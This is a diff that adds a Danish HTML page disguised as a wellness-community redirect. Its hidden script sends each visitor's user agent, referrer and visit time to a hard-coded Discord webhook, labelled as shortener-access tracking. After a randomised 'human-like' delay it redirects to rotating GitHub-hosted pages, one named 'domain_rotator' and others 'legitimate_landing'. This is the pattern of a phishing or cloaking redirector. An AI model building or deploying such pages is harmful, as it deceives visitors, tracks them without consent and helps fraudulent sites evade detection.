@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wellness Link - Hurtig Adgang</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0; padding: 0; min-height: 100vh;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .container {
+            background: white; border-radius: 15px;
+            padding: 40px; text-align: center; max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .loading { 
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🧘‍♀️ Wellness Community</h2>
+        <p>Omdirigerer til den sikreste wellness side...</p>
+        <div class="loading"></div>
+        <p><small>Forbinder til premium indhold</small></p>
+    </div>
+    
+    <script>
+        // Random delay for human-like behavior
+        const delay = Math.random() * 2000 + 1000;
+        
+        // Track access
+        fetch('https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🎯 **Shortener Access**\n**UserAgent:** ${navigator.userAgent}\n**Referrer:** ${document.referrer}\n**Time:** ${new Date().toISOString()}`
+            })
+        }).catch(() => {});
+        
+        // Redirect after delay
+        setTimeout(() => {
+            const urls = [
+                'https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/legitimate_landing.html',
+                'https://cdn.jsdelivr.net/gh/Jeki1234121/hollistisk-v2/legitimate_landing.html',
+                'https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/domain_rotator.html'
+            ];
+            
+            const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+            window.location.href = randomUrl;
+        }, delay);
+    </script>
+</body>
+</html>
